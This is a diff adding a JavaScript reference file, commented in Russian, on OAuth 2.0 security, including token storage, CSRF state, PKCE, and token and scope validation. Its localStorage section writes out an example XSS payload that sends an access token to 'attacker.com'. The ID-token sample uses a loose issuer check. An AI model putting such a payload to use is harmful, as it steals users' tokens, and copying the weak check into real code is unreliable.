@@ -1,0 +1,280 @@
+
+// ============================================
+// БЕЗОПАСНОСТЬ OAUTH 2.0
+// ============================================
+
+/**
+ * CRITICAL: Где НЕ хранить токены
+ */
+const unsafeStorage = {
+  localStorage: {
+    vulnerable: 'XSS атаки',
+    reason: 'JavaScript может прочитать',
+    example: `
+      // ❌ ОПАСНО
+      localStorage.setItem('access_token', token)
+
+      // Атакующий может украсть:
+      <script>
+        fetch('https://attacker.com/?token=' + localStorage.getItem('access_token'))
+      </script>
+`
+},
+
+sessionStorage: {
+vulnerable: 'XSS атаки',
+reason: 'Доступно из JavaScript',
+sameAs: 'localStorage'
+},
+
+cookies: {
+vulnerable: 'CSRF атаки (если без httpOnly)',
+safe: 'httpOnly + Secure + SameSite',
+example: `
+// ✅ БЕЗОПАСНО
+Set-Cookie: access_token=...;
+HttpOnly;        // Недоступно из JS
+Secure;          // Только HTTPS
+SameSite=Strict; // Защита от CSRF
+Max-Age=3600
+`
+}
+}
+
+/**
+* Безопасное хранение токенов
+*/
+const safeTokenStorage = {
+option1_memory: {
+description: 'В переменной в памяти (React state)',
+security: '⭐⭐⭐⭐⭐',
+drawback: 'Теряется при перезагрузке',
+
+example: `
+// React
+const [accessToken, setAccessToken] = useState(null)
+
+// При входе
+const tokens = await login()
+setAccessToken(tokens.access_token)
+
+// При перезагрузке - используем refresh_token
+useEffect(() => {
+refreshAccessToken()
+}, [])
+`
+},
+
+option2_httpOnlyCookie: {
+description: 'httpOnly cookie на backend',
+security: '⭐⭐⭐⭐⭐',
+recommended: true,
+
+backend: `
+// Express.js
+app.post('/auth/callback', async (req, res) => {
+const tokens = await exchangeCodeForTokens(req.body.code)
+
+// Устанавливаем httpOnly cookies
+res.cookie('access_token', tokens.access_token, {
+httpOnly: true,
+secure: true,
+sameSite: 'strict',
+maxAge: 3600000 // 1 час
+})
+
+res.cookie('refresh_token', tokens.refresh_token, {
+httpOnly: true,
+secure: true,
+sameSite: 'strict',
+maxAge: 2592000000 // 30 дней
+})
+
+res.json({ success: true })
+})
+`,
+
+frontend: `
+// Frontend - токены автоматически в cookies
+fetch('/api/protected', {
+credentials: 'include' // Отправляет cookies
+})
+`
+},
+
+option3_bff: {
+description: 'Backend for Frontend (BFF) паттерн',
+security: '⭐⭐⭐⭐⭐',
+bestFor: 'Enterprise приложения',
+
+architecture: `
+[Browser] <--session cookie--> [BFF] <--access token--> [API]
+
+- Frontend: только session ID в httpOnly cookie
+- BFF: хранит и управляет OAuth токенами
+- API: получает токены от BFF
+`
+}
+}
+
+/**
+* Защита от атак
+*/
+const securityMeasures = {
+csrf_protection: {
+threat: 'Cross-Site Request Forgery',
+solution: 'state parameter',
+
+implementation: `
+// Генерируем случайный state
+const state = crypto.randomUUID()
+sessionStorage.setItem('oauth_state', state)
+
+// Отправляем в authorization request
+const authUrl = '/authorize?state=' + state + '&...'
+
+// Проверяем при возврате
+const urlParams = new URLSearchParams(window.location.search)
+const returnedState = urlParams.get('state')
+const savedState = sessionStorage.getItem('oauth_state')
+
+if (returnedState !== savedState) {
+throw new Error('CSRF attack detected!')
+}
+`
+},
+
+pkce_protection: {
+threat: 'Authorization code interception',
+solution: 'PKCE (Proof Key for Code Exchange)',
+required: 'Для SPA и мобильных приложений',
+
+implementation: `
+// 1. Генерируем code_verifier
+function generateCodeVerifier() {
+const array = new Uint8Array(32)
+crypto.getRandomValues(array)
+return base64UrlEncode(array)
+}
+
+// 2. Создаем code_challenge
+async function generateCodeChallenge(verifier) {
+const encoder = new TextEncoder()
+const data = encoder.encode(verifier)
+const hash = await crypto.subtle.digest('SHA-256', data)
+return base64UrlEncode(new Uint8Array(hash))
+}
+
+// 3. Используем в auth flow
+const verifier = generateCodeVerifier()
+const challenge = await generateCodeChallenge(verifier)
+
+sessionStorage.setItem('code_verifier', verifier)
+
+// Authorization request
+window.location.href = '/authorize?' +
+'code_challenge=' + challenge +
+'&code_challenge_method=S256'
+
+// Token request
+const tokens = await fetch('/token', {
+method: 'POST',
+body: JSON.stringify({
+code,
+code_verifier: sessionStorage.getItem('code_verifier')
+})
+})
+`
+},
+
+token_validation: {
+idToken: `
+// Проверка ID Token (JWT)
+import jwt from 'jsonwebtoken'
+
+function validateIdToken(idToken, clientId) {
+const decoded = jwt.decode(idToken, { complete: true })
+
+// 1. Проверка audience
+if (decoded.payload.aud !== clientId) {
+throw new Error('Invalid audience')
+}
+
+// 2. Проверка expiration
+if (decoded.payload.exp < Date.now() / 1000) {
+throw new Error('Token expired')
+}
+
+// 3. Проверка issuer
+if (!decoded.payload.iss.startsWith('https://')) {
+throw new Error('Invalid issuer')
+}
+
+// 4. Проверка подписи (через JWKS)
+return jwt.verify(idToken, getPublicKey(decoded.header.kid))
+}
+`,
+
+accessToken: `
+// Проверка Access Token на backend
+app.use('/api', async (req, res, next) => {
+const token = req.headers.authorization?.split(' ')[1]
+
+if (!token) {
+return res.status(401).json({ error: 'No token' })
+}
+
+try {
+// Option 1: Introspection endpoint
+const introspection = await fetch('https://oauth.com/introspect', {
+method: 'POST',
+body: new URLSearchParams({ token })
+})
+const result = await introspection.json()
+
+if (!result.active) {
+return res.status(401).json({ error: 'Invalid token' })
+}
+
+req.user = result
+next()
+} catch (error) {
+res.status(401).json({ error: 'Token validation failed' })
+}
+})
+`
+},
+
+scope_validation: {
+description: 'Проверка разрешений',
+
+example: `
+// Middleware для проверки scope
+function requireScope(...requiredScopes) {
+return (req, res, next) => {
+const tokenScopes = req.user.scope.split(' ')
+
+const hasAllScopes = requiredScopes.every(
+scope => tokenScopes.includes(scope)
+)
+
+if (!hasAllScopes) {
+return res.status(403).json({
+error: 'Insufficient permissions'
+})
+}
+
+next()
+}
+}
+
+// Использование
+app.get('/api/admin',
+requireScope('admin:read', 'admin:write'),
+(req, res) => {
+// Только с нужными scopes
+}
+)
+`
+}
+}
